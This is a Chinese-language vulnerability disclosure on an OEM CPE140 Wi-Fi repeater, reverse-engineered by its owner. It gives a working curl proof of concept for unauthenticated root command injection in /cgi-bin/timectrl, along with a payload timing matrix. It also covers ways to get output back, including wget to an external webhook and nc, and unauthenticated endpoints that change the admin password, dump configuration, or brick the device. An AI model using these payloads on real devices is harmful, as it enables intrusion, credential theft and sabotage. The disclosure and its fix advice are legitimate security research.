# 易阔 CPE140 中继器 —— 逆向报告（公开脱敏版）

> 目标：自有设备 `http://192.168.188.254`（出厂默认 LAN 地址，WISP 中继模式）
> 结果：**取得 root shell**（未授权、零风险路径），设备已完全恢复原状
> 说明：本版**抹掉了所有本机环境信息**（SSID / PSK / MAC / 口令字面量），
> 只保留可复现的技术结论。完整版（含取证文件与凭据）仅存本地。

---

## 0. 一句话结论

设备真身是 **BHU BXO2000n-2S-Lite**（易阔贴牌 OEM），SoC = **Atheros AR9341**，跑 OpenWrt 19.07。
存在 **未认证 root 命令注入**（`/cgi-bin/timectrl`）与 **全机型统一的硬编码出厂 root 口令**。
两条路都到 root，且都是"零改动、可复原"的。

---

## 1. 设备真实身份

| 项 | 值 |
|---|---|
| 商品名 | 易阔 CPE140（`PRODUCTNAME=CPE140`，`FIRMVERSION=易阔CPE-AP-V9.0-Build20200423114236`）|
| **真实型号** | **`bxo2000n-2s-lite` / "BHU BXO2000n-2S-Lite"**（见 `/tmp/sysinfo/model`、`/etc/banner`）|
| 主机名 | `BHU` |
| **SoC** | **Atheros AR9341 rev 1**（MIPS 74Kc V4.12 / mips_24kc）—— *不是* MT7628（初判修正）|
| 无线 | 单 2.4G radio `wlan0`；上行 STA 走 `apcli0`（ralink 风格接口名，但 SoC 是 Atheros）|
| 系统 | **OpenWrt 19.07-SNAPSHOT r45217-4d0eb261db**，Linux 4.14.149，musl，ar71xx/generic |
| 构建 | `dolly@Develop-Server` + OpenWrt GCC 7.4.0，**2020-05-06** |
| 内存 / Flash | 64MB RAM，8MB SPI-NOR |
| Web | `uhttpd -h /www -x /cgi-bin -r BHU -t 60` |
| CGI | **只有一个二进制 `parentcgi`（46325B）**，`/www/cgi-bin/*` 全是它的符号链接 |

### MTD 分区

```
mtd0 u-boot 256K   mtd1 u-boot-env 64K   mtd2 rootfs 6.4M   mtd3 rootfs_data 640K
mtd4 kernel 1.25M  mtd5 cfg 64K          mtd6 oem 64K        mtd7 art 64K
mtd8 firmware 7.5M mtd9 fullflash 8M
```

### 真实 CGI 端点（以设备为准）

```
active  devmanage  easyconfig  lan  lan_dhcpserver  login  parentcgi  showhtml
sysinfo  timectrl  upload  wan  wireless  wireless_adv  wireless_channel
wireless_scan  wireless_status
```

注意：`sys_arplist` / `channel_info` / `fit_fat_switch` **在这版固件里不存在**
（`common.js` 里虽然引用了 `/cgi-bin/fit_fat_switch`，但请求 404）。

---

## 2. 🚨 漏洞 1：未认证 root 命令注入（CRITICAL）

**入口（无需任何 Cookie / token）**：

```
POST /cgi-bin/timectrl
Content-Type: application/json

{"opcode":"3","cronpara":"2","AUTO_REBOOT_ENABLED":"1",
 "AUTO_REBOOT_WEEK":"0","AUTO_REBOOT_HOUR":"4","AUTO_REBOOT_MIN":"0"}
```

**根因**（`ps` 抓到子进程，铁证）：

```
/www/cgi-bin/timectrl
└─ sh -c "uci -c /etc/config set administrator.reboot.week=<我们传入的值>"
```

`parentcgi` 用 `system()`/`popen()` 把 JSON 字段值**未转义**拼进 shell 命令行。
值外层是**双引号**，因此：

* `;` `&&` `|` → 无效（在双引号里就是普通字符）
* **`` `cmd` `` 与 `$(cmd)` → 命令替换，以 root 执行** ✅

**PoC（纯计时证明，零副作用）**：

```bash
# 正常请求 ~0.10s；下面这个精确延迟 6 秒 → 证明 sleep 真被执行
curl -s -X POST http://192.168.188.254/cgi-bin/timectrl \
  -H 'Content-Type: application/json' \
  -d '{"opcode":"3","cronpara":"2","AUTO_REBOOT_ENABLED":"1",
       "AUTO_REBOOT_WEEK":"0$(sleep 6)","AUTO_REBOOT_HOUR":"4","AUTO_REBOOT_MIN":"0"}'
```

实测矩阵（全部**不带 Cookie**）：

| 字段 | 载荷 | 结果 |
|---|---|---|
| WEEK / HOUR / MIN / ENABLED | ``0`sleep 6` `` | **6.12s = 执行** |
| WEEK | `0$(sleep 6)` | **6.14s = 执行** |
| WEEK | `0;sleep 6;#` | 0.23s（`;` 在双引号内失效）|
| 任意 | 正常值 | 0.10–0.18s（基线）|

**取值上限**：单次注入 ≈ **960 字节**（CGI 内部命令缓冲）。931 字节可用，981 字节起失败
（`$(` 被截断不闭合 → 整条不执行）。

**影响**：任意能访问 `设备:80` 的网络节点（LAN 侧任一客户端、或 CSRF 一个已连上该 AP 的浏览器）
→ **以 root 执行任意命令**。

### 输出回显通道

注入本身只回 JSON，没有回显。可用：

1. **写 docroot 再取**：`` $(cmd > /tmp/x) `` + `ln -s /tmp/x /www/x` → `GET /x`
   （`/www` 可写，uhttpd 会跟随符号链接；`cp` 会把源文件权限带过来，
   若源是 600（如 `/etc/shadow`）uhttpd 会回 **403**，所以结尾要 `chmod 644`）
2. 设备能出网：可 `wget` 打到外部 webhook（`aptrack`/`monitor` 本就会联网）
3. 有 `nc`

---

## 3. 🚨 漏洞 2：全机型同一把硬编码出厂 root 口令

`/rom/etc/uci-defaults/13_cs-default`（出厂首次启动执行）：

```sh
cs_setup_passwd() {
	echo "<出厂口令>" > /tmp/tmppwd
	echo "<出厂口令>" >> /tmp/tmppwd
	passwd < /tmp/tmppwd
	rm -f /tmp/tmppwd
}
```

口令字面量在本公开版已隐去（写出来等于替所有同型号设备开后门）。
**可自证**：从自己的固件里读这个脚本即可得到同一把口令。

零风险对拍验证（不改设备）：

```bash
openssl passwd -1 -salt CJewIHdB '<出厂口令>'
# → 与设备 /etc/shadow 里 root 的哈希逐字节一致 ✅
```

* `/rom/etc/shadow`（原厂只读层）：`root::0:0:99999:7:::` = **空口令**
* `/etc/shadow`（overlay）：`root:$1$CJewIHdB$<hash>:18388:...`
  （18388 = 2020-05-06 = 构建日，说明首次启动时被脚本设过）

**dropbear**：`PasswordAuth on` + **`RootPasswordAuth on`**，端口 22
→ 拿到口令即可直接 `ssh root@设备`。

**影响**：该型号/OEM 设备出厂即共用同一口令，任何能碰到设备或 22 端口的人都能 root。

### 同厂其他型号对照（不通用）

* **CPE870**（同厂 Yunlink 2024 版固件）：root 哈希 `$1$fY5eQ7UX$...` ≠ 本机口令，
  属不同代产品线；其未认证 RCE 在 `/protocol.csp?fname=system&opt=time_conf&time=$(cmd)`，
  本机无 `/protocol.csp`。

---

## 4. 🚨 漏洞 3：其它未认证接口

| 接口 | 问题 |
|---|---|
| `POST /cgi-bin/devmanage?opcode=8` `{name,oldpassword,password}` | **无 Cookie 也返回 `{"result":"0"}` → 未授权改管理员口令** |
| `POST /cgi-bin/easyconfig` `{"opcode":"1"}` | 无认证返回**全量 79 项配置**，含明文管理员口令与上下行 WiFi PSK |
| `easyconfig` opcode=3 | 无认证**部分写配置**（只改指定 key） |
| `wireless / wan / lan / wireless_status / wireless_scan / sysinfo` | 无认证读 |
| `devmanage` opcode 3 / 4 / 5 | 恢复出厂 / 升级 / 重启（同样无认证 → 可远程变砖）|

**补充结论**：

* `easyconfig op=3` 的字符串字段有**字符白名单**：`;` `` ` `` `$` `|` 等全被拒（`a"b` 会让 CGI 挂 ~20s）。
  即"注入只在这一个端点、只走 `timectrl`"。
* `admin` / `root` Web 登录名可登，但**没有它照样能读改一切**。
* `devmanage?opcode=6`（NTP 时间）恒回 `{}`；`showhtml` 502；`system_throughput` 404。

---

## 5. U-Boot 恢复要点（救砖底牌）

```
setenv ipaddr 192.168.1.1 ; setenv serverip 192.168.1.10
lf 'tftp 0x80060000 rootfs.squashfs; erase 0x9f050000 +$filesize; cp.b $fileaddr 0x9f050000 $filesize'
lk 'tftp 0x80060000 vmlinux.lzma.uImage; erase 0x9f690000 +$filesize; cp.b $fileaddr 0x9f690000 $filesize'
bn bxo2000n_2s_lite
```

整片备份用 `dd if=/dev/mtd9`（8MB，含 u-boot + art + 全部配置）。

---

## 6. 设备状态：已恢复原样 ✅

* `/etc/shadow` 写回原厂哈希（未改成自己的口令）
* `/www`、`/root/.ssh`、`/etc/dropbear`、`/tmp` 里投放的文件全部删除
* `/etc/crontabs/root` 与 `autoreboot` 脚本生成的原始内容一致
* `easyconfig` 全量配置与动手前的基线快照 **IDENTICAL**
* SSH 22 / HTTP 80 / DNS 53 正常，上行 STA 在线

> 唯一的不可逆痕迹：overlay（jffs2）的物理块被改写过，整片 md5 与首次 dump 不同。
> 这不影响使用，配置层面已逐项核对一致。

---

## 7. 修复建议（给厂商 / 给同型号用户）

**给厂商：**

1. `parentcgi` 里所有 `system()`/`popen()` 改为 `execve` 传参数组，或对值先做严格整数校验再拼接
2. `timectrl` / `devmanage` / `easyconfig` 全部强制鉴权（校验 session/token，当前一个都不校验）
3. 升级 / 恢复出厂 / 重启类 opcode 加认证 + 二次确认
4. 去掉 `uci-defaults` 里的固定口令，改为随机生成或首次强制设置
5. dropbear 默认关闭 `RootPasswordAuth`

**给用户（立刻做）：**

1. **改 root 口令**：`ssh root@设备` → `passwd`
2. 不需要 SSH 就把 22 端口关掉/只允许信任源
3. 别把设备的 80 端口暴露到公网（含 DMZ / 端口映射）
4. 定期 `dd if=/dev/mtd9 of=/tmp/backup.bin` 备份整片 flash

---

## 8. 工具与合规

本目录的 `cpe140.py`（PC 版）与同仓库 `CPE140Ctrl`（安卓版）把上述两个通道做成了
**免密管理台**。仅限**自己拥有或已获书面授权**的设备使用。
把命令注入当作"免密通道"本身就是在用漏洞 —— 请勿指向他人设备。
